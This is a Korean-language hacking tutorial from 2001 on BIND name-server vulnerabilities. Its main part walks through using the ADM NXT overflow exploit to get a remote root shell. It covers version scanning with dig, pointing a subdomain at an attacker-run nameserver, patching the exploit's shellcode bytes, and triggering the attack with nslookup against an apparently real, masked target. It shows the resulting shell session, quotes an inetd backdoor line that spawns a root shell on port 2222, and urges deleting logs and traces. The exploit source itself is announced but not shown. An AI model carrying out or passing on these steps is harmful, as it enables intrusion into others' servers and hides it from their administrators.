
 ===================================================================================
 Title : Domain Name System Bind attack
 Author : 유동훈 (Xpl017Elz)
 E-mail : szoahc@hotmail.com
 Home: http://x82.i21c.net
 Date : 2001/3/06 
 ===================================================================================  

 작자주: 이 문서는 DNS attack에 대해 공부하는 이들을 위해 제작되었습니다. 
 만약, 문서의 내용중 오류가 있다면 szoahc@hotmail.com으로 mail 주시면 감사하겠습니다.

Domain Name System Bind attck

 Domain Name System이란 … 인터넷 호스트 이름을 IP 주소로 변환하는 시스템을 말한다.
 DNS는 항상 작동해왔다.  IP 주소에서 도메인으로 전환하기 위해 리눅스와 유닉스계열
 에서는 Bind(Berkeley Internet Name Domain) 어플리케이션을 채택해왔다.
 물론 우리는 DNS가 심각한 취약점을 가지고 있는것을 알아채지 못했다.

 얼마전에야 DNS의 취약점들이 하나하나씩 밝혀지면서 해커들의 시선을 주목하게 되었다.
 한마디로 DNS는 심각한 보안문제를 지니고 있었음에도 불구하고 오랜 기간동안
 묻혀왔던것이다.

 현재 도메인과 IP를 전환해주는 서버로 Bind 네임서버를 사용하고 있다.
 Version은 9.1.0 최신 버전이다. (아직은 문제점이 발견되지 않았다.)
 그 이전 Version의 Bind 들은 모두 심각한 취약점을 지니고 있다.

 만약 당신이 취약점을 가지고있는 서버를 운영중이라면 업데이트를 권장하는 바이다.
 Bind 9.1.0 - ftp://ftp.isc.org/isc/bind9/9.1.0/bind-9.1.0.tar.gz
 PGP Signature for BIND 9.1.0 <PGP 서명>
 - ftp://ftp.isc.org/isc/bind9/9.1.0/bind-9.1.0.tar.gz.asc

 자 그럼, 문제점을 알아보도록 하자...
 이미 2000년 말,2001년에 Bind 공격 Exploit 이 인터넷상으로 공개되있다.
 당신은 이를 구하기위해 그리 힘들지 않은 웹서핑을 통해 쉽게 찾아낼수 있을것이다.
 Bind의 밝혀진 취약점을 공개하겠다.
 

 (1) Tsig bug (TSIG 핸들링 버퍼오버플로우 취약점)

 Versions affected:  8.2, 8.2-P1, 8.2.1, 8.2.2-P1, 8.2.2-P2, 8.2.2-P3, 8.2.2-P4,
 8.2.2-P5, 8.2.2-P6, 8.2.2-P7, and all 8.2.3-betas

 Description:
 It is possible to overflow a buffer handling TSIG signed queries, thereby
 obtaining access to the system.

 BIND 8 버전에서는 트랜잭션 시그너쳐(TSIG) 핸들링 코드에 버퍼오버플로우 취약점을
 가지고 있다. 그 이유는 유효한 키를 포함하지 않는 TSIG를 발견한후 에러응답을 보내기
 위한 코드를 실행하게 되는데 바로 이때 발생하는 변수 초기화 방식의 차이에 의해
 취약점이 발생하게 된다. 

 문제점의 결과 - BIND의 실행권한으로 공격자가 임의의 코드를 실행시킬 수 있다.

 (2) infoleak (information leak 취약점)

 Versions affected: 4.8, 4.8.3, 4.9.3, 4.9.4, 4.9.5, 4.9.5-P1, 4.9.6, 4.9.7, 8.1, 8.1.1,
 8.1.2, 8.2, 8.2-P1, 8.2.1, 8.2.2-P1, 8.2.2-P2, 8.2.2-P3, 8.2.2-P4, 8.2.2-P5,
 8.2.2-P6, 8.2.2-P7, possibly earlier versions of BIND 4.9.x and BIND 4.9

 Description:
 It is possible to construct a inverse query that allows the stack to be read
 remotely exposing environment variables.  

 BIND 4 시리즈중 4.9.7 이전버전과 BIND 8 시리즈 중 8.1.2이전 버전은 외부에서
 inverse query요청에 대하여 응답을 수행할때에 메모리에서의 적절한 한계값 검사를
 하지 않아서 buffer overflow 취약점이 존재한다.
 
 특수한 포맷 형태를 가진 쿼리 전송을 통해 공격자가 프로그램 스택에 접근할수 있게
 함으로써 취약점을 발생시킨다. 결과적으로 root 권한의 획득이 가능하다.

 문제점의 결과 - 공격자가 쿼리를 처리하는 프로그램의 스택에서 정보(환경변수 정보)를
                     읽을 수 있게 하고 이는 BIND 4 버전에 대한 다른 공격에 도움을 줄 수 있다.

 공격당한 시스템중의 일부는 /var/named/ADMROCKS 라는 empty 디렉토리가
 생기기도 하며,  /etc/inetd.conf에는 2222번 port의 back door가 생성되기도 한다.

 2222 stream tcp nowait root /bin/sh sh -i

 (3) complain bug (nslookupComplain() 버퍼오버플로우 취약점)

 Versions affected:     4.9.3, 4.9.4, 4.9.5, 4.9.5-P1, 4.9.6, 4.9.7, possible earlier  
 versions of BIND 4.9.x and BIND 4.9.

 Description:
 It is possible to overflow the buffer used by sprintf in nslookupComplain().

 BIND 4 버전에서는 nslookupComplain() 내부에 있는 문자 배열
 (syslog를 위한 에러 메시지 작성 버퍼) 에 대해 버퍼오버플로우 취약점을 포함하고 있다.
 특수한 포맷 형태를 가진 쿼리를 전송함으로써 취약점을 발생시킨다.

 문제점 - nslookupComplain() sprintf에 의해서 BIND 서버의 정상적인 동작을 방해할수
          있으며 BIND의 실행권한으로 공격자가 임의의 코드를 실행시킬수 있다.

 (4) NXT bug (NXT-Bind Overflow 취약점)

 Versions affected:     8.2, 8.2 patchlevel 1, 8.2.1

 Description:
 A bug in the processing of NXT records can theoretically allow an attacker to gain access
 to the  system running the DNS server at whatever privilege level the DNS server runs at.

 BIND 8.2, 8.2 p1, 8.2.1버젼에서는 NXT레코드에 대한 적절한 validate를 하지 못하는
 버그를 가지고 있다. 이러한 NXT 레코드 확인 작업수행중의 버그를 이용하여 외부에서
 buffer Overflow 공격을 통해 임의의 code를 수행함으로써 named를 수행하고 있는
 권한에 해당하는 권한의 쉘을 획득할수 있게된다.

 이미 exploit 소스코드가 1999년 말에 인터넷상에 공개되어 있는 상태다.  
 코드를 실행시킨 상태에서 목표네임서버가 이 name space상에서 exploit 프로그램에
 query를 하게끔 조작을 하게되면 목표네임서버가 버퍼오버플로우가 일어나면서,

 named 데몬이 종료되고 Bind가 실행되는 권한(대부분이 root에서 이 작업을 수행한다.)
 으로 1524 포트를 여는 백도어 /tmp/bob 파일이 만들어진다. 공격을 당하는 과정에서
 /var/named/ADMROCKS 라는 empty 디렉토리가 생성된다.

 (5) solinger bug (Denial of Service 취약점)

 Versions affected:     8.1, 8.1.1, 8.1.2, 8.2, 8.2 patchlevel 1, 8.2.1

 Description:
 It is possible to remotely cause BIND to "pause" for intervals of up to 120 seconds
 using an abnormal TCP session.

 BIND 8.1 이상 버전에서는 외부에서 비정상적인 TCP session을 사용함으로써
 named 데몬을 120초 정도까지 수행정지상태로 만드는 서비스거부 공격이 가능하다.

 (6) fdmax bug (Denial of Service 취약점)

 Versions affected:     8.1, 8.1.1, 8.1.2, 8.2, 8.2 patchlevel 1

 Description
 A bug in the handling of file descriptors results in a vulnerability that will crash the DNS
 server when more than FD_SETSIZE descriptors are consumed.

 named 데몬은 수행되면서 일정한 수의 file descriptor들을 manage하게 되어 있는데,
 외부에서 공격용 프로그램을 실행시킴으로서 /usr/include/sys/select.h에 정의되어 있는  
 FD_SETSIZE에서 지정된 수보다 많은 수의 file descriptor를 사용해버리게 되면 실행되고
 있던 named 데몬이 crash되게 된다.

 이제껏 Bind 공격 및 취약점에 대해서 대충 알아보았다.
 당신은 지금 원하는것이 있을것이다. 그리고 이루고 싶을것이다. 분명히 밝히지만 사전준비
 없이 공격은 아무런 의미가 없다. 요새 새로나온 exploit들을 통해 실행만으로 다른서버의   
 쉘을 획득할수 있을것이다. 그런 당신은 Script kid 에 지나지 않는다.

 노력을 통해 쉘을 얻기 원하는가?
 named 의 지식과 기타 Bind 전반적인 이해를 통해알수 있는 공격을 시도해보자.
 리모트공격중 전세계 해킹유형의 40% 이상을 차지하며 가장 많은 공격기법으로 평가받는
 유명한 공격을 배워보도록 하자 :-)

 공격의 이름은 NXT-Bind Overflow 공격이다.
 ADM named 8.2/8.2.1 NXT remote overflow exploit 라는 소스코드가 1999년 말에
 인터넷상에 공개되었다. 소스파일은 간단한 수정에 의해 우리가 다시 사용하게 될것이다.
 자, 이제부터 본격적인 공격을 시도해보자.

 당신은 지금부터 준비할것이 있다. 번거롭지만 이해바란다. 일단 루트권한의 서버가
 2개이상 필요하다. 2개의 루트권한 서버가 있다면 당신은 자격을 가지고 있다.

 (1) 원격(remote)에서 Bind Version Scan 한다.

 $ dig @<victim_ip> version.bind chaos txt | grep \"8
 [x82@dns x82]$ dig @localhost version.bind chaos txt | grep \"8
  VERSION.BIND.           0S CHAOS TXT    "8.2"
 [x82@dns x82]$

 위를 보면 알겠지만 버전은 이미 취약점을 지니고 있다.

 ex2>
 [x82@dns x82]$ dig @localhost version.bind chaos txt 

 더욱더 자세한 정보를 요구한다.

 ; <<>> DiG 8.2 <<>> @localhost version.bind chaos txt
 ; (1 server found)
 ;; res options: init recurs defnam dnsrch
 ;; got answer:
 ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 10
 ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
 ;; QUERY SECTION:
 ;;      version.bind, type = TXT, class = CHAOS 

 ;; ANSWER SECTION:
 VERSION.BIND.           0S CHAOS TXT    "8.2" 

 ;; Total query time: 0 msec
 ;; FROM: dns.sonet21.com to SERVER: localhost  127.0.0.1
 ;; WHEN: Thu Jan 25 02:41:53 2001
 ;; MSG SIZE  sent: 30  rcvd: 58 

 [x82@dns x82]$   

(2) 제 1 루트서버의 네트웍설정을 변경하자.
서브도메인 추가를 위해 zone 파일을 수정하여 서비스를 재시작 해야할것이다.

 x82       IN      NS      exploit.t666.com.

서비스를 하는 서버 xpl017elz.com 의 zone 파일을 수정하여,
x82.xpl017elz.com 이라는 서브도메인을 추가하였다.

이때 x82.xpl017elz.com 은 exploit.t666.com 서버를 가리키게 될것이다.
새로운 내용으로 수행되려면 서비스를 재시작해야 한다.

 # /usr/sbin/ndc restart
 new pid is 24774
 #

(3) 제 2 루트서버에서 Bind OverFlow 익스플로잇
(ADM named 8.2/8.2.1 NXT remote overflow exploit)을 실행시키자.

T666의 소스는 직접 수정을 해야 공격이 가능해진다.
0x2f,0x61,0x64,0x6d,0x2f 부분의 소스코드를 찾아 0x2f,0x62,0x69,0x6e,0x2f 로
변경하면 된다. 이번엔 컴파일한후 루트의 권한으로 실행시키자.

 $ su
 Password:
 # ./t666 1
 # 리눅스를 대상으로 할것이기 때문에 1번

 만약 서버상에서 named 서버가 돌고있는중이라면 killall -9 named 명령으로 프로세스를
 죽인다. 그후 익스플로잇을 다시 실행하면 될것이다.

 (4) 질의하는 방법

 이제 공격만 남았다. 취약점을 가진 Bind 버전이 있는 서버를 찾은뒤,
 시범공격을 해보자.

 $ nslookup x82.xpl017elz.com xxx.xxx.xxx.xxx (www.xxx.co.kr의 IP)
 Server:  www.xxx.co.kr
 Address:  xxx.xxx.xxx.xxx

 (5) 결과

 NXT-BIND 익스플로잇을 루트권한으로 실행하기 위한 서버에 와있다.

[xpl017elz@ns xpl017elz]$ ls -al
total 52
drwxr-xr-x     4 xpl017   stud         4096 Jan 25 12:10 .
drwxrwxr-x   503 root     root        12288 Nov  3 15:48 ..
drwxr-xr-x     2 xpl017   stud         4096 Nov 14 15:23 .bash_history
-rw-r--r--     1 root     root        14637 Jan 24 07:38 .newsrc
-rw-r--r--     1 root     root         1470 Jan 24 07:36 .oldnewsrc
drwx------     5 root     root         4096 Jan 24 07:38 .tin
-rw-r--r--     1 root     root         6243 Jan 25 12:09 a.c 

[xpl017elz@ns xpl017elz]$ pwd
/home/xpl017elz
[xpl017elz@ns xpl017elz]$ cd /tmp
[xpl017elz@ns /tmp]$ ls -al
total 24
drwxrwxrwx    5 root     root         4096 Jan 25 12:10  .
drwxr-xr-x   19 root     root         4096 Jan 20 02:49  ..
-r--r--r--    1 root     root           11 Jan 25 08:55 .X0-lock
drwxrwxrwt    2 root     root         4096 Jan 25 08:55 .X11-unix
drwxrwxrwt    2 xfs      xfs          4096 Nov  3 14:30 .font-unix
drwxr-xr-x    2 root     root         4096 Jan 25 07:48 dir

[xpl017elz@ns /tmp]$ rz
rz waiting to receive.

[xpl017elz@ns /tmp]$ gcc -o t666 t666.c

 수정한 exploit 소스를 컴파일했다.

[xpl017elz@ns /tmp]$ rm -rf t666.c
[xpl017elz@ns /tmp]$ ls -al
total 80
drwxrwxrwx   5 root     root         4096 Jan 25 12:56 .
drwxr-xr-x  19 root     root         4096 Jan 20 02:49 ..
-r--r--r--   1 root     root           11 Jan 25 08:55 .X0-lock
drwxrwxrwt   2 root     root         4096 Jan 25 08:55 .X11-unix
drwxrwxrwt   2 xfs       xfs         4096 Nov  3 14:30 .font-unix
drwxr-xr-x   2 root     root         4096 Jan 25 07:48 a
-rwxr-xr-x   1 xpl017   stud        53136 Jan 25 12:56 t666

[xpl017elz@ns /tmp]$ su

passwd:  루트권한에서 실행하기 위해 패스워드 입력

[root@ns /tmp]# ./t666

 T666을 실행하니 다음과 같은 결과를 얻을수 있었다. 버전별로 공격할수 있도록
 옵션이 주어져 있었다. exploit을 실행시켰을때는 대기상태로 돌아간다.

Usage: ./t666 architecture [command]
Available architectures:
  1: Linux Redhat 6.x    - named 8.2/8.2.1 (from rpm)
  2: Linux SolarDiz's non-exec stack patch - named 8.2/8.2.1
  3: Solaris 7 (0xff)       - named 8.2.1
  4: Solaris 2.6             - named 8.2.1
  5: FreeBSD 3.2-RELEASE - named 8.2
  6: OpenBSD 2.5         - named 8.2
  7: NetBSD 1.4.1         - named 8.2.1

[root@ns /tmp]# ./t666 1

 리눅스 레드헷계열이기 때문에 1번 옵션을 선택하였다.
 대기상태로 돌아갔다.

 또 다른 하나의 쉘을 연다. 물론 루트계정이든 일반계정이든 상관없다. 질의하자. 실질적인
 공격이 되겠다.

  $ nslookup x82.xpl017elz.com xxx.xxx.xxx.xxx (공격당할 target IP)
  Server:  www.xxx.co.kr
  Address:  xxx.xxx.xxx.xxx

 자, 대기상태였던 루트서버에 결과가 올것이다.  

 Received request from xxx.xxx.xxx.xxx:1190 for x82.xpl017elz.com.hackergroup.co.kr type=1
 Entering proxyloop..
 Linux www.xxx.co.kr 2.2.5-22 #1 Wed Jun 2 09:17:03 EDT 1999 i686 unknown 
 /
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)

 드디어 고생끝에 Bind가 실행되는 권한 (root)을 얻게 되었다. 하지만 Bind가 실행되는 권한이  
 named일 경우도 있다. 얻는결과는 다음과 같다.

 Received request from xxx.xxx.xxx.xxx:1190 for x82.xpl017elz.com.hackergroup.co.kr type=1
 Entering proxyloop..
 Linux www.xxx.co.kr 2.2.5-22 #1 Wed Jun 2 09:17:03 EDT 1999 i686 unknown
 /
 uid=25(named) gid=25(named) groups=25(named)

 위와 같을 경우는 쉘을 얻는데 성공하였으나 루트가 되기위해 로컬에서 수고를 해야할것이다.
 로컬공격 exploit은 이미 인터넷상에 널려져 있다.

 # ls -al
 total 2105455
 drwxr-xr-x  26 root     root         1024 Jan 24 22:51 .
 drwxr-xr-x  26 root     root         1024 Jan 24 22:51 ..
 drwxr-xr-x   2 root     root         1024 Apr  9  1999 .automount
 drwxr-xr-x   2 root     root         1024 Jan 24 22:51 .bash_history
 drwx------   3 root     root         1024 Dec 14  1999 .gnome
 drwx------   2 root     root         1024 Dec 12  1999 .gnome_private
 drwxr-xr-x   2 root     root         1024 Dec 15  1999 backup
 drwxr-xr-x   2 root     root         2048 Jan 18 19:45 bin
 drwxr-xr-x   2 root     root         1024 Jan 19 05:32 boot
 drwxr-xr-x   2 root     root         1024 Dec 12  1999 cd
 drwxr-xr-x   9 root     root        34816 Jan 21 04:02 dev
 drwxr-xr-x  34 root     root         3072 Jan 24 00:09 etc
 drwxr-xr-x   2 root     root         1024 Dec 13  1999 flp
 drwxr-xr-x  23 root     root         1024 Jan 24 00:09 home
 drwxr-xr-x   4 root     root         3072 Nov 23 02:40 lib
 drwxr-xr-x   2 root     root        12288 Dec 12  1999 lost+found
 drwxr-xr-x   2 root     root         1024 Apr 10  1999 misc
 drwxr-xr-x   4 root     root         1024 Dec 12  1999 mnt
 drwxrwxrwx   2 root     root         1024 Dec 12  1999 mysql
 dr-xr-xr-x   2 root     root          512 Jan 18 20:32 net
 dr-xr-xr-x  72 root     root            0 Jan 19 05:31 proc
 drwxr-x---  14 root     root         2048 Jan 25 04:05 root
 drwxr-xr-x   3 root     root         3072 Jan 18 04:06 sbin
 drwxrwxrwt   4 root     root         2048 Jan 25 04:02 tmp
 drwxr-xr-x  22 root     root         1024 Dec 12  1999 usr
 drwxr-xr-x  21 root     root         1024 Jan 24 23:02 var

 # cd /tmp
 # ls -al
 total 5262

 drwxrwxrwt   4 root     root         2048 Jan 25 04:02 .
 drwxr-xr-x  26 root     root         1024 Jan 24 22:51 ..
 drwxrwxrwt   2 xfs      xfs          1024 Jan 18 20:32 .font-unix
 drwx------   2 root     root         3072 Feb 24  2000 orbit-root
 -r-xr-xr-x   1 root     root      1857165 Dec 12  1999 php-3_0_12_tar.tar
 -rw-------   1 root     root         4156 Jan 18 04:06 upgrade.log

 # cd ..
 # hostname
 dns.xxx.co.kr

 공격한 호스트가 맞는가?
 당신은 로그와 나머지 흔적들을 지우고 나올 의무가 있다. 쉘에 남는 로그들을 전부 수정하거나
 삭제해야 할것이다. .bash_history 파일이 / 상위디렉에 남지않도록 디렉토리를 생성하자.

 # exit
 Connection closed by foreign host. 

 여기서 여러분의 이해를 돕기위해 간단히 공격방식과 원리를 서술하겠다.
 자세히 읽어보길 바란다 :-)

 루트권한의 서버 2개가 필요함.



 수정한 네임서버 즉, x82.xpl017elz.com 은 제 2서버의 주소를 가리키게 된다. 분명
 53번으로 query가 갈것이다. 제 2 서버는 해커의 exploit을 돌리고 있다.
 물론 제 2 서버의 Bind와 같은 역할을 할것이다. 53번을 해커의 exploit이 지키고 있는셈이다.

 자, 공격해보자
 nslookup x82.xpl017elz.com(제 2 서버를 가리킨다.) 공격할 target
 nslookup을 통해 공격 target서버를 기준으로 x82.xpl017elz.com의 네임서버
 정보를 찾게된다. 이때 공격 target 서버는 x82.xpl017elz.com (exploit이 돌고있는 제 2 서버)의 53번으로
 query를 보낸다. 그러면 제 2 서버의 exploit이 53번을 지키고 있다가 Buffer Overflow
 를 일으키는 코드를 반송하게 된다. tatget 서버는 어떻게 되겠는가?
 분명 Overflow가 일어나 쉘을 내뱉어낼것이다. 

 제 2 서버에 응답이 온다.
 이를 T666(exploit)이 출력한다.


 nslookup에 의해 target 서버는 사실상 서버 1에 query를 보낸다 서버 1은 서버 2를
 가리킨다. 즉, exploit에 query 를 보내는것이다. 물론 취약점이 있는 서버라면
 서버 2 에서 exploit 코드를 반송받고 /bin/bash를 내뱉어 줄것이다.

 아래는 공격이 가능하도록 고친 t666 소스이다.
 소스명: ADM named 8.2/8.2.1 NXT remote overflow exploit

 
